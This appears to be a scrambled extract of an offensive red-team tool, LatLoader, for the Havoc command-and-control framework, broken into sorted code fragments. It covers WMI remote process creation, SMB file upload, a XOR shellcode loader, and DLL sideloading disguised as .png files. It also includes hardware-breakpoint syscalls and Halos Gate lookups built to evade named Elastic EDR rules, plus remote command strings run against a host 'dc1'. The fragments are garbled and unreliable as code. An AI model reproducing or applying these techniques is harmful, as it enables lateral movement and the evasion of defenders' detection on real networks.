@@ -1,0 +1,461 @@
+"( ""LatLoader"", ""Laterally move via WMI using a simple shellcode loader"", """", ""[subcommand] (args"
+"( STR, ... "
+"( TaskID, ""go"", f""bin/ProcCreate.{demon.ProcessArch}.o"", packer.getbuffer("
+"( TaskID, ""go"", f""bin/writefileBOF.{demon.ProcessArch}.o"", packer.getbuffer("
+"( demon.CONSOLE_ERROR, ""Not enough parameters"" "
+"( demon.CONSOLE_ERROR, ""Too many parameters"" "
+"( demon.CONSOLE_ERROR, ""x86 is not supported"" "
+"( demon.CONSOLE_TASK, f""Perfoming lateral movement with provided exe..."" "
+"( demon.CONSOLE_TASK, f""Perfoming lateral movement with xor shellcode loader via DLL sideloading..."" "
+"( demon.CONSOLE_TASK, f""Perfoming lateral movement with xor shellcode loader..."" "
+"( demon.CONSOLE_TASK, f""Tasked demon to copy {params[1]} to {remotePath} on {target} via SMB"""
+"( demon.CONSOLE_TASK, f""Tasked demon to run {command} on {target} via wmi"" "
+"( demonID, *params "
+"( demonID, *params"
+"( load, ""LatLoader"", ""load"", ""Upload file over SMB and execute it via WMI"", 0, ""target local_file"", ""dc1 /root/test.exe"""
+"( sideload, ""LatLoader"", ""sideload"", ""Perform lateral movement by DLL sideloading a simple shellcode loader with evasions for Elastic EDR rules"", 0, ""target raw_demon_file"", ""dc1 /root/demon.x64.bin"""
+"( smb_writefile, ""LatLoader"", ""rupload"", ""Upload a file over SMB"", 0, ""target local_file remote_path"", ""dc1 /root/test.exe C:\\Windows\\Temp\\test.exe"""
+"( wmi_proccreate, ""LatLoader"", ""exec"", ""Execute a file or command via WMI"", 0, ""target command"", ""dc1 \""cmd.exe /c whoami > C:\\poc3.txt\"""" "
+"( xorload, ""LatLoader"", ""xorload"", ""Perform lateral movement using a simple shellcode loader"", 0, ""target raw_demon_file"", ""dc1 /root/demon.x64.bin"""
+"(!pSetThreadContext(myThread, &ctx"
+"("":"""
+"(""<L"", self.size"
+"(""==============================================\n\n"""
+"(""Attemping to read %s\n"", fileName"
+"(""Error: dwBytesWritten != dwBytesToWrite\n"""
+"(""ExecMethod Succeeded!"""
+"(""ExecMethod failed: 0x%08x"", hres"
+"(""GetMethod failed: 0x%08x"", hres"
+"(""GetObject failed: 0x%08x"", hres"
+"(""GetObject2 failed: 0x%08x"", hres"
+"(""KERNEL32.DLL"", (PBYTE"
+"(""SpawnInstance failed: 0x%08x"", hres"
+"(""SpawnInstance2 failed: 0x%08x"", hres"
+"(""Terminal failure: Unable to write to file.\n"""
+"(""[!] Could not find a suitable \""ADD RSP,68;RET\"" gadget in kernel32 or kernelbase. InitHWSyscalls failed."""
+"(""[!] Could not register VEH: 0x%X\n"", GetLastError("
+"(""[+] Continuing with normal execution\n"""
+"(""[+] Created a new stack frame with RET_GADGET (%#llx"
+"(""[+] Found %s address: 0x%I64X\n"", (const char*"
+"(""[+] Found RET_GADGET in kernel32.dll: %#llx\n"", retGadgetAddress"
+"(""[+] Found RET_GADGET in kernelbase.dll: %#llx\n"", retGadgetAddress"
+"(""[+] Found SSN: 0x%X\n"", syscallNumber"
+"(""[+] Found \""syscall;ret;\"" opcode address: 0x%I64X\n"", syscallReturnAddress"
+"(""[+] Function is HOOKED!\n"""
+"(""[+] Function is not hooked\n"""
+"(""[+] Jumping to \""syscall;ret;\"" opcode address: 0x%I64X\n"", syscallReturnAddress"
+"(""[+] Looking for the SSN via Halos Gate\n"""
+"(""[+] Main HWBP set successfully\n"""
+"(""[+] Moving RCX to R10 (mov r10, rcx"
+"(""[+] Moving SSN to RAX (mov rax, 0x%X"
+"(""[+] Moving breakpoint back to PrepareSyscall to catch the next invoke\n"""
+"(""[+] Moving breakpoint to %#llx\n"", ntFunctionAddress"
+"(""[+] NTAPI Function Breakpoint Hit (%#llx"
+"(""[+] Original stack arguments successfully copied over to the new stack\n"""
+"(""[-] Could not find SSN\n"""
+"(""[-] Could not find \""syscall;ret;\"" opcode address\n"""
+"(""[-] Could not set new thread context: 0x%X"", GetLastError("
+"(""\n===============HWSYSCALLS DEBUG==============="""
+"(""\n[+] PrepareSyscall Breakpoint Hit (%#llx"
+"(""argv[1]: %s\n"", argv[1]"
+"(""argv[2]: %s\n"", argv[2]"
+"(""kernelbase.dll"", (PBYTE"
+"(""targetHost: %s\n"", targetHost"
+"(""utf-16_le"""
+"(""utf-8"" "
+"(""{:02x}"".format(test"
+"(&authInfo, &authidentity, bwusername, bwpassword, bwdomain, IsCurrent"
+"(&parser, NULL"
+"(&parser, args, length"
+"(&parser, buf, len"
+"(&parser, buff, len"
+"(0, &pParamsInstance"
+"(0, &pStartupInstance"
+"(0, COINIT_APARTMENTTHREADED"
+"(0, COINIT_MULTITHREADED"
+"(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE"
+"(0, wslen"
+"(1, &HWSyscallExceptionHandler"
+"(; *szMask; ++szMask, ++pData, ++bMask"
+"(BOOL x86, BOOL ignoreToken, STARTUPINFO * sInfo, PROCESS_INFORMATION * pInfo"
+"(BOOL x86, char * buffer, int length"
+"(CALLBACK_ERROR, ""CoCreateInstance failed: 0x%08x"", hr"
+"(CALLBACK_ERROR, ""CoInitializeEx failed: 0x%08lx"", hr"
+"(CALLBACK_ERROR, ""CoSetProxyBlanket failed: 0x%08x"", hr"
+"(CALLBACK_ERROR, ""ConnectServer failed: 0x%08x"", hr"
+"(CALLBACK_ERROR, ""ExecMethod failed: 0x%08x"", hr"
+"(CALLBACK_ERROR, ""GetMethod failed: 0x%08x"", hr"
+"(CALLBACK_ERROR, ""GetObject failed: 0x%08x"", hr"
+"(CALLBACK_ERROR, ""GetObject2 failed: 0x%08x"", hr"
+"(CALLBACK_ERROR, ""SpawnInstance failed: 0x%08x"", hr"
+"(CALLBACK_ERROR, ""SpawnInstance2 failed: 0x%08x"", hr"
+"(CALLBACK_OUTPUT, ""Error: dwBytesWritten != dwBytesToWrite\n"""
+"(CALLBACK_OUTPUT, ""ExecMethod Succeeded!"""
+"(CALLBACK_OUTPUT, ""IsCurrent: %d"", IsCurrent"
+"(CALLBACK_OUTPUT, ""Terminal failure: Unable to open file \""%s\"" for write.\n"", filePath"
+"(CALLBACK_OUTPUT, ""Terminal failure: Unable to write to file.\n"""
+"(CALLBACK_OUTPUT, ""Wrote %d bytes to %s successfully.\n"", dwBytesWritten, filePath"
+"(CALLBACK_OUTPUT, ""bwcommandline: %s"", bwcommandline"
+"(CALLBACK_OUTPUT, ""bwdomain: %s"", bwdomain"
+"(CALLBACK_OUTPUT, ""bwpassword: %s"", bwpassword"
+"(CALLBACK_OUTPUT, ""bwtarget2: %s"", bwtarget2"
+"(CALLBACK_OUTPUT, ""bwusername: %s"", bwusername"
+"(CALLBACK_OUTPUT, ""dwBytesToWrite: %d"", dwBytesToWrite"
+"(CALLBACK_OUTPUT, ""remotePath: %s"", remotePath"
+"(CALLBACK_OUTPUT, ""targetHost: %s"", targetHost"
+"(COAUTHINFO** authInfo, COAUTHIDENTITY** authidentity, wchar_t* user, wchar_t* password, wchar_t* domain, int IsCurrent"
+"(CP_ACP, 0, argv[2], strlen(argv[2]"
+"(CP_ACP, 0, targetHost, strlen(targetHost"
+"(Cwbm, 0, CLSCTX_INPROC_SERVER, Iwbm, (void**"
+"(Cwbmstr, &Cwbm"
+"(DWORD64 functionAddress, WORD syscallNumber"
+"(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask"
+"(DataBuffer, sizeof(unsigned char"
+"(Elastic, MDE, etc"
+"(FindPattern(pFunctionAddress, 4, (PBYTE"
+"(HANDLE ProcessHandle, PVOID BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect"
+"(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes"
+"(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len"
+"(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved"
+"(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities"
+"(Iwbmstr, &Iwbm"
+"(L""CommandLine"""
+"(L""Create"""
+"(L""CurrentDirectory"""
+"(L""ProcessStartupInformation"""
+"(L""ShowWindow"""
+"(L""Win32_Process"""
+"(L""Win32_ProcessStartup"""
+"(L""\\\\dc1\\ROOT\\CIMV2"""
+"(L""cmd.exe /c \""whoami > c:\\wmi2.txt\"""""
+"(L""{4590f811-1d3a-11d0-891f-00aa004b2e24}"""
+"(L""{dc12a687-737f-11cf-884d-00aa004b2e24}"""
+"(LPCSTR moduleName, PBYTE bMask, PCHAR szMask"
+"(LPVOID, DWORD"
+"(LoadLibrary(""C:\\Windows\\System32\\CRYPTBASE.dll"""
+"(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len"
+"(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv"
+"(TEXT(""Terminal failure: Unable to open file \""%s\"" for write.\n"""
+"(TEXT(""Writing %d bytes to %s.\n"""
+"(TEXT(""Wrote %d bytes to %s successfully.\n"""
+"(UINT64 moduleBase, const char* functionName"
+"(`load`, `xorload`, & `sideload`"
+"(argv[2], GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL"
+"(base_addr, decoded, size"
+"(buffer, len"
+"(char * args, int length"
+"(char * src, wchar_t * dst, int max"
+"(char *__stream, const char *__format, ..."
+"(char* buff, int len"
+"(const BYTE* pData, const BYTE* bMask, const char* szMask"
+"(datap * parser, char * buffer, int size"
+"(datap * parser, int * size"
+"(demonFile, XOR_KEY, ""bin/xordemon.bin"""
+"(demonID, *params"
+"(demonID, newParams"
+"(exec, decoded, size"
+"(f""[+] File encoded successfully! Saved to: {outfile}"""
+"(f""[+] Here is your key: {key}"""
+"(f""[debug] [exec] num_params1: {num_params}"""
+"(f""[debug] [exec] num_params: {num_params}"""
+"(f""[debug] [exec] params1: {params}"""
+"(f""[debug] [exec] params: {params}"""
+"(f""[debug] [exec] type(params[0]"
+"(f""[debug] [load] params: {params}"""
+"(f""[debug] [rupload] params: {params}"""
+"(f""[debug] [rupload] type(params[0]"
+"(f""[debug] [sideload] params: {params}"""
+"(f""[debug] [xorload] params: {params}"""
+"(file, 0, SEEK_END"
+"(fileName, ""rb"""
+"(fileName, ""rb+"""
+"(filePath, ""\\\\%s\\C$%s"", targetHost, remotePath"
+"(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL"
+"(fmt, 1 if b else 0"
+"(fmt, len(b"
+"(fmt, len(s"
+"(fmt, n"
+"(formatp * format, char * fmt, ..."
+"(formatp * format, char * text, int len"
+"(formatp * format, int * size"
+"(formatp * format, int maxsz"
+"(formatp * format, int value"
+"(hFile, DataBuffer, dwBytesToWrite, &dwBytesWritten, NULL"
+"(hStdin, &mode"
+"(hStdin, mode & (~ENABLE_ECHO_INPUT"
+"(infile, 'rb'"
+"(infile, key, outfile"
+"(int argc, char **argv"
+"(int argc, char *argv[]"
+"(int type, char * data, int len"
+"(int type, char * fmt, ..."
+"(kernel, window system, and so on"
+"(lib, ""comsuppw.lib"""
+"(lib, ""credui.lib"""
+"(lib, ""wbemuuid.lib"""
+"(myThread, &ctx"
+"(outfile, ""wb"""
+"(pFunctionAddress, syscallNumber"
+"(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks"
+"(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, authidentity, EOAC_NONE"
+"(params[1], ""rb"""
+"(s, str"
+"(self, b"
+"(self, n"
+"(self, s"
+"(shellcode, key, strlen(key"
+"(shellcode, sizeof(unsigned char"
+"(srv, NULL, NULL, 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &pSvc"
+"(targetHost, ""bin/loader.exe"", ""C:\\Windows\\load.exe"""
+"(targetHost, ""bin/signed_sideloader.dll"", ""C:\\Windows\\cryptbase.png"""
+"(targetHost, ""bin/xordemon.bin"", ""C:\\Windows\\image02.png"""
+"(targetHost, ""cmd.exe /c C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache"""
+"(targetHost, ""cmd.exe /c C:\\Windows\\load.exe"""
+"(targetHost, ""cmd.exe /c copy C:\\Windows\\System32\\DiskSnapShot.exe C:\\Windows\\DiskSnapShot.exe && echo --path C:\\Windows\\CCMCache\\cache"""
+"(targetHost, ""cmd.exe /c copy C:\\Windows\\cryptbase.png C:\\Windows\\cryptbase.dll && echo --path C:\\Windows\\CCMCache\\cache"""
+"(targetHost, 32, ""\\\\%s\\ROOT\\CIMV2"", argv[1]"
+"(targetHost, targetFile, ""C:\\Windows\\load.exe"""
+"(unsigned char *encoded, unsigned char key[], int keylen, int long size"
+"(void* buffer, ULONG len"
+"(wa,text,size"
+"(wcClassName, 0, NULL, &pClass, NULL"
+"(wcClassName, wcMethodName, 0, NULL, pParamsInstance, &pOutParams, NULL"
+"(wcCommandLine, 0, &varCommand, 0"
+"(wcCurrentDirectory, 0, &varCurrentDir, 0"
+"(wcMethodName, 0, &pInParamsDefinition, NULL"
+"(wcProcessStartupInfo, 0, &vtDispatch, 0"
+"(wcShowWindow, 0, &varParams, 0"
+"(wcStartup, 0, NULL, &pStartupObject, NULL"
+"(wchar_t* lpsz, LPCLSID pclsid"
+"(wchar_t* lpsz, LPIID lpiid"
+"(wcsstr(pEntry->FullDllName.Buffer, moduleName"
+( demonID 
+( pclsObj 
+(!FindRetGadget(
+(!InitHWSyscalls(
+(!SUCCEEDED(hr
+(!SUCCEEDED(hres
+(!exceptionHandlerHandle
+(!imageBase
+(!moduleName
+(!pNtAllocateVirtualMemory
+(!sectionOffset
+(&parser
+(&varCommand
+(&varCurrentDir
+(&varParams
+(&vtDispatch
+((DWORD_PTR
+((LPWSTR
+((PBYTE
+((UINT64
+((char*
+((const wchar_t*
+((void(*
+()
+(*((PBYTE
+(*SystemFunction036_Type
+(*szMask == 'x' && *pData != *bMask
+(...
+(1
+(1 << 0
+(1 << 16
+(1 << 17
+(2
+(3
+(49
+(@The_Keeb
+(BOF
+(BSTR bstrString
+(C
+(CC_x64
+(COAUTHIDENTITY
+(COAUTHIDENTITY*
+(COAUTHINFO
+(COAUTHINFO*
+(CXX_x64
+(Cwbmstr
+(DWORD
+(DWORD i = 0; i < dwLen; i++
+(DWORD j = 0; j < exportDirectory->NumberOfNames; j++
+(DWORD*
+(DWORD64
+(DWORD64 functionAddress
+(DWORD_PTR
+(DataBuffer
+(DeinitHWSyscalls(
+(EXCEPTION_POINTERS* ExceptionInfo
+(ExceptionInfo->ContextRecord->Rcx
+(ExceptionInfo->ContextRecord->Rip == (DWORD64
+(ExceptionInfo->ContextRecord->Rsp
+(ExceptionInfo->ContextRecord->Rsp + offset
+(ExceptionInfo->ContextRecord->Rsp + offset + 0x70
+(ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP
+(FAILED(hr
+(FAILED(hres
+(FALSE == bErrorFlag
+(GetCurrentProcess(
+(GetModuleAddress((LPWSTR
+(GetThreadContext_t
+(HANDLE
+(HANDLE token
+(IMAGE_NT_HEADERS
+(IsCurrent == 0
+(Iwbmstr
+(KERNEL32$GetProcessHeap(
+(LPVOID *
+(LPWSTR moduleName
+(LPWSTR sModuleName
+(Like [this one](https://github.com/elastic/protections-artifacts/commit/7310e500a6178b6d9f5c189f9ac8de155037836f#diff-a546f8d6214e32d67e92e76125daa6cb3a4d516616c79f12ccdadffd9c3c2b5b
+(MaskCompare((PBYTE
+(NTAPI *NtAllocateVirtualMemory_t
+(NtAllocateVirtualMemory_t
+(PCHAR
+(PIMAGE_DOS_HEADER
+(PIMAGE_EXPORT_DIRECTORY
+(PIMAGE_NT_HEADERS
+(PIMAGE_SECTION_HEADER
+(PPEB
+(PROCESS_INFORMATION * pInfo
+(PULONG64
+(STD_INPUT_HANDLE
+(STR
+(SUCCEEDED(hr
+(SUCCEEDED(hres
+(SetThreadContext_t
+(SystemFunction036_Type
+(UINT64
+(USHORT*
+(VARIANTARG *pvarg
+(WINAPI* GetThreadContext_t
+(WINAPI* SetThreadContext_t
+(WMI
+(WMIBOFNAME
+(WORD idx = 1; idx <= 32; idx++
+(WORD idx = 1; idx <= 500; idx++
+(WORD*
+(WRITEFILEBOFNAME
+(X64_PEB_OFFSET
+(_stricmp((char*
+(a
+(at your option
+(b
+(bwcommandline
+(bwpassword
+(bwtarget2
+(bwusername
+(bytes(encoded
+(char* functionName
+(command
+(const OLECHAR *
+(const char *str
+(const char*
+(const char* text
+(const wchar_t *_Str
+(datap * parser
+(decoded
+(dllexport
+(domain
+(dosHeader->e_magic != IMAGE_DOS_SIGNATURE
+(dwAddress + i
+(dwBytesWritten != dwBytesToWrite
+(exceptionHandlerHandle
+(file
+(file == NULL
+(fileBytes
+(fileBytes[0:10]
+(fmt
+(for any work
+(formatp * format
+(gratis or for a charge
+(hFile
+(hFile == INVALID_HANDLE_VALUE
+(high << 8
+(hr != RPC_E_CHANGED_MODE
+(https://github.com/HavocFramework/Havoc
+(https://github.com/ShorSec/HWSyscalls
+(https://github.com/Yaxser/CobaltStrike-BOF/blob/master/WMI%20Lateral%20Movement/WMI-ProcessCreate.cpp
+(https://github.com/elastic/protections-artifacts
+(https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_dll_side_loading_via_a_copied_microsoft_executable.toml
+(https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_virtualprotect_api_call_from_an_unsigned_dll.toml
+(https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_execution_of_a_file_dropped_from_smb.toml
+(https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_imageload_of_a_file_dropped_via_smb.toml
+(https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/lateral_movement_unsigned_file_execution_via_network_logon.toml
+(https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Havoc.yar
+(https://github.com/elastic/protections-artifacts/commit/7310e500a6178b6d9f5c189f9ac8de155037836f
+(https://github.com/icyguider/LatLoader#elastic-edr-rule-evasions
+(https://github.com/icyguider/LatLoader/assets/79864975/340d7cf5-2307-48ef-9e7c-fcd8f7cb103b
+(https://github.com/icyguider/LatLoader/assets/79864975/384c9c70-aeeb-4b5d-a261-3a5724468009
+(https://github.com/icyguider/LatLoader/assets/79864975/8af2aa2e-7ddb-496d-8b34-dc67860b38c8
+(https://github.com/icyguider/LatLoader/assets/79864975/90d569fc-ee15-4ed4-9ad5-d984454ea597
+(https://github.com/icyguider/LatLoader/assets/79864975/9f5b6315-7414-4c09-a5e1-68900ad58f4a
+(https://github.com/icyguider/LatLoader/assets/79864975/ea475419-ca1a-4786-b40c-6716638e1e5b
+(https://github.com/mtrojnar/osslsigncode
+(https://learn.microsoft.com
+(https://twitter.com/C5pider
+(https://twitter.com/Idov31
+(https://twitter.com/Yas_o_h
+(https://twitter.com/dec0ne
+(https://twitter.com/s4ntiago_p
+(https://www.elastic.co
+(https://www.elastic.co/guide/en/security/current/potential-lateral-tool-transfer-via-smb-share.html
+(https://www.elastic.co/guide/en/security/current/remote-execution-via-file-shares.html
+(https://www.elastic.co/guide/en/security/current/wmi-incoming-lateral-movement.html
+(if any
+(if you work as a programmer
+(including a cross-claim or counterclaim in a lawsuit
+(including a physical distribution medium
+(int i = 0; i < size; i++
+(is_current
+(key[b % len(key
+(len(b
+(len(contents
+(len(fileBytes
+(len(s
+(moduleBase + dosHeader->e_lfanew
+(moduleBase + exportDirectory->AddressOfFunctions
+(moduleBase + exportDirectory->AddressOfNameOrdinals
+(moduleBase + exportDirectory->AddressOfNames
+(moduleBase + names[j]
+(moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
+(moduleName
+(ntHeaders->Signature != IMAGE_NT_SIGNATURE
+(operated by you or a third party
+(optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0
+(or copies made from those copies
+(pFunctionAddress
+(params
+(params[0]
+(pass
+(password
+(random.choice(letters
+(regardless of how the transaction is characterized
+(remotePath
+(retGadgetAddress != 0
+(rsmudge
+(sectionOffset
+(self
+(shellcode
+(size
+(size_t idx = 0; idx < STACK_ARGS_LENGTH; idx++
+(srv
+(syscallNumber == 0
+(syscallReturnAddress == 0
+(target
+(test
+(text
+(ul_reason_for_call
+(unsigned char *
+(unsigned char*
+(username
+(usr
+(wcClassName
+(wcCommandExecute
+(wcCommandLine
+(wcCurrentDirectory
+(wcMethodName
+(wcProcessStartupInfo
+(wcShowWindow
+(wcStartup
+(wchar_t*
+(with or without modification
